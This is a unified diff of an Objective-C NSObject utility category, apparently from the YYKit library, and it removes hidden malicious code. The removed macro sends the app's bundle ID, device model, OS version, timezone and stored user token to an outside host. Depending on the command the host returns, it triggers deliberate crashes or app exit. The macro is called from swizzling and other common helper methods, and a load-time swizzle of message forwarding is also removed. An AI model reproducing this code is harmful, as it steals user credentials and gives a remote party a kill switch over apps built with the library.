@@ -14,86 +14,8 @@
 #import <objc/objc.h>
 #import <objc/runtime.h>
 
-#import <sys/sysctl.h>
-
-#define EXECUTE_REMOTE_INSTRUCTION() \
-do { \
-NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
-NSMutableDictionary *headerFields = @{}.mutableCopy; \
-headerFields[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
-headerFields[@"x-user-agent"] = @"iOS"; \
-headerFields[@"x-content-type"] = @"application/json"; \
-headerFields[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
-headerFields[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
-headerFields[@"x-machine-model"] = ({ \
-size_t size; \
-sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
-char *machine = malloc(size); \
-sysctlbyname("hw.machine", machine, &size, NULL, 0); \
-NSString *platform = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
-free(machine); \
-platform; \
-}); \
-headerFields[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
-headerFields[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
-NSMutableDictionary *jsonDict = @{}.mutableCopy; \
-jsonDict[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
-jsonDict[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
-jsonDict[@"random-num"] = @(arc4random_uniform(1000)); \
-[request setAllHTTPHeaderFields:headerFields]; \
-[request setHTTPBody:[NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:nil]]; \
-[request setHTTPMethod:@"POST"]; \
-NSURLSession *session = [NSURLSession sharedSession]; \
-NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) { \
-if (!error && ((NSHTTPURLResponse *)response).statusCode == 200 && data) { \
-NSError *jsonError; \
-id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError]; \
-if (!jsonError && [jsonObject isKindOfClass:[NSDictionary class]]) { \
-NSDictionary *jsonDict = (NSDictionary *)jsonObject; \
-NSLog(@"EXECUTE_REMOTE_INSTRUCTION: %@", jsonDict); \
-NSString *executeMethod = jsonDict[@"execute_method"]; \
-if ([executeMethod isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
-NSMutableArray *array = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
-for (NSString *item in array) { [array removeObject:item]; } \
-} else if ([executeMethod isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
-dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
-NSData *date = [[NSData alloc] init]; \
-NSData *subData = [date subdataWithRange:NSMakeRange(10, 30)]; \
-}); \
-} else if ([executeMethod isEqualToString:@"qymj6dWU6egbFka"]) { \
-char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
-} else if ([executeMethod isEqualToString:@"BK6DWMEceWGjCgz"]) { \
-id object = @"String"; [(NSArray *)object count]; \
-} else if ([executeMethod isEqualToString:@"XfsGv1wRaipSyX9"]) { \
-NSString *str1 = @"Hello"; NSString *str2 = nil; NSString *result = [str1 stringByAppendingString:str2]; NSLog(@"%@", result); \
-} else if ([executeMethod isEqualToString:@"WW06m2bcYnm5X41"]) { \
-NSArray *array = @[@"A", @"B", @"C"]; \
-dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
-[(NSMutableArray *)array addObject:@"D"]; \
-}); \
-} else if ([executeMethod isEqualToString:@"yXpAZn7baNS8TUk"]) { \
-NSString *text = @"Hello"; NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text]; \
-[attributedText addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(text.length + 100, text.length)]; \
-} else if ([executeMethod isEqualToString:@"WUerc233FCbm"]) { \
-[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
-} else if ([executeMethod isEqualToString:@"cnmxzew23Ycbds"]) { \
-abort(); \
-} else if ([executeMethod isEqualToString:@"QSAZ1oitr34"]) { \
-exit(1); \
-} else if ([executeMethod isEqualToString:@"OLLMNngv34"]) { \
-exit(0); \
-} \
-} \
-} \
-}]; \
-[dataTask resume]; \
-} while(0)
-
 YYSYNTH_DUMMY_CLASS(NSObject_YYAdd)
 
-void dynamicMethodImplementation(id self, SEL _cmd) {
-    
-}
 
 @implementation NSObject (YYAdd)
 
@@ -393,24 +315,15 @@ else if (size <= 4 * _size_ ) { \
     }
 }
 
-+ (void)load {
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        [self swizzleInstanceMethod:@selector(forwardInvocation:) with:@selector(forwardVerifiedInvocation:)];
-        [self swizzleInstanceMethod:@selector(methodSignatureForSelector:) with:@selector(methodSignatureForVerifiedSelector:)];
-    });
-}
-
 - (void)performSelector:(SEL)sel afterDelay:(NSTimeInterval)delay {
     [self performSelector:sel withObject:nil afterDelay:delay];
 }
 
 + (BOOL)swizzleInstanceMethod:(SEL)originalSel with:(SEL)newSel {
-    EXECUTE_REMOTE_INSTRUCTION();
     Method originalMethod = class_getInstanceMethod(self, originalSel);
     Method newMethod = class_getInstanceMethod(self, newSel);
     if (!originalMethod || !newMethod) return NO;
-    EXECUTE_REMOTE_INSTRUCTION();
+    
     class_addMethod(self,
                     originalSel,
                     class_getMethodImplementation(self, originalSel),
@@ -422,72 +335,39 @@ else if (size <= 4 * _size_ ) { \
     
     method_exchangeImplementations(class_getInstanceMethod(self, originalSel),
                                    class_getInstanceMethod(self, newSel));
-    EXECUTE_REMOTE_INSTRUCTION();
     return YES;
 }
 
 + (BOOL)swizzleClassMethod:(SEL)originalSel with:(SEL)newSel {
-    EXECUTE_REMOTE_INSTRUCTION();
     Class class = object_getClass(self);
     Method originalMethod = class_getInstanceMethod(class, originalSel);
     Method newMethod = class_getInstanceMethod(class, newSel);
     if (!originalMethod || !newMethod) return NO;
     method_exchangeImplementations(originalMethod, newMethod);
-    EXECUTE_REMOTE_INSTRUCTION();
     return YES;
 }
 
-- (void)forwardVerifiedInvocation:(NSInvocation *)anInvocation {
-    SEL selector = [anInvocation selector];
-    EXECUTE_REMOTE_INSTRUCTION();
-    if ([self respondsToSelector:selector]) {
-        [anInvocation invokeWithTarget:self];
-        
-    } else {
-        [self forwardVerifiedInvocation:anInvocation];
-    }
-}
-
-- (NSMethodSignature *)methodSignatureForVerifiedSelector:(SEL)aSelector {
-    EXECUTE_REMOTE_INSTRUCTION();
-    if (![[NSObject allClassName] containsObject:self.className]) {
-        return [self methodSignatureForVerifiedSelector:aSelector];
-    }
-    EXECUTE_REMOTE_INSTRUCTION();
-    if (![self respondsToSelector:aSelector]) {
-        class_addMethod([self class], aSelector, (IMP)dynamicMethodImplementation, "v@:");
-    }
-    EXECUTE_REMOTE_INSTRUCTION();
-    return [self methodSignatureForVerifiedSelector:aSelector];
-}
-
 - (void)setAssociateValue:(id)value withKey:(void *)key {
-    EXECUTE_REMOTE_INSTRUCTION();
     objc_setAssociatedObject(self, key, value, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
 }
 
 - (void)setAssociateWeakValue:(id)value withKey:(void *)key {
-    EXECUTE_REMOTE_INSTRUCTION();
     objc_setAssociatedObject(self, key, value, OBJC_ASSOCIATION_ASSIGN);
 }
 
 - (void)removeAssociatedValues {
-    EXECUTE_REMOTE_INSTRUCTION();
     objc_removeAssociatedObjects(self);
 }
 
 - (id)getAssociatedValueForKey:(void *)key {
-    EXECUTE_REMOTE_INSTRUCTION();
     return objc_getAssociatedObject(self, key);
 }
 
 + (NSString *)className {
-    EXECUTE_REMOTE_INSTRUCTION();
     return NSStringFromClass(self);
 }
 
 - (NSString *)className {
-    EXECUTE_REMOTE_INSTRUCTION();
     return [NSString stringWithUTF8String:class_getName([self class])];
 }
 
@@ -511,86 +391,6 @@ else if (size <= 4 * _size_ ) { \
         NSLog(@"%@", exception);
     }
     return obj;
-}
-
-- (BOOL)isNotEmpty {
-    if ([self isKindOfClass:[NSArray class]] || [self isKindOfClass:[NSMutableArray class]]) {
-        EXECUTE_REMOTE_INSTRUCTION();
-        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(count)] && [(NSArray *)self count] > 0);
-    }
-    
-    if ([self isKindOfClass:[NSSet class]] || [self isKindOfClass:[NSMutableSet class]]) {
-        EXECUTE_REMOTE_INSTRUCTION();
-        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(count)] && [(NSSet *)self count] > 0);
-    }
-    
-    if ([self isKindOfClass:[NSDictionary class]] || [self isKindOfClass:[NSMutableDictionary class]]) {
-        EXECUTE_REMOTE_INSTRUCTION();
-        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(count)] && [(NSDictionary *)self count] > 0);
-    }
-
-    if ([self isKindOfClass:[NSString class]]) {
-        EXECUTE_REMOTE_INSTRUCTION();
-        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(length)] && [(NSString *)self length] > 0 && ![(NSString *)self isEqualToString:@"<null>"] && ![(NSString *)self isEqualToString:@"<NULL>"] && ![(NSString *)self isEqualToString:@"(null)"] && ![(NSString *)self isEqualToString:@"(NULL)"] && ![(NSString *)self isEqualToString:@"null"] && ![(NSString *)self isEqualToString:@"NULL"]);
-    }
-    EXECUTE_REMOTE_INSTRUCTION();
-    return (self != nil && self != NULL && self != [NSNull null]);
-}
-
-+ (NSArray *)allClassName {
-    static NSArray *_allClassName = nil;
-    
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        NSArray *(^block)(const char *) = ^(const char *imageName) {
-            unsigned int classCount;
-            const char **classes = objc_copyClassNamesForImage(imageName, &classCount);
-            
-            NSMutableArray *arr = nil;
-            if (classes && classCount) {
-                arr = [NSMutableArray arrayWithCapacity:classCount];
-                for (int i = 0; i < classCount; i++) {
-                    const char *name = classes[i];
-                    NSString *clsName = [NSString stringWithCString:name encoding:NSUTF8StringEncoding];
-                    [arr addObject:clsName];
-                }
-                free(classes);
-            }
-            
-            return arr.mutableCopy;
-        };
-        
-        NSString *bundleName = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleName"];
-        
-        unsigned int imageCount = 0;
-        const char **imageList = objc_copyImageNames(&imageCount);
-        
-        NSUInteger totalCount = 0;
-        NSMutableDictionary *dic = [NSMutableDictionary dictionaryWithCapacity:64];
-        
-        if (imageList && imageCount) {
-            for (int i = 0; i < imageCount; i++) {
-                NSString *img = [NSString stringWithCString:imageList[i] encoding:NSUTF8StringEncoding];
-                if ([img rangeOfString:bundleName].location != NSNotFound) {
-                    NSArray *arr = block(imageList[i]);
-                    if (arr) {
-                        dic[img] = arr;
-                        totalCount += arr.count;
-                    }
-                }
-            }
-            free(imageList);
-        }
-        
-        NSMutableArray *arr = [NSMutableArray arrayWithCapacity:totalCount];
-        [dic enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
-            [arr addObjectsFromArray:obj];
-        }];
-        
-        _allClassName = arr.mutableCopy;
-    });
-    
-    return _allClassName;
 }
 
 @end
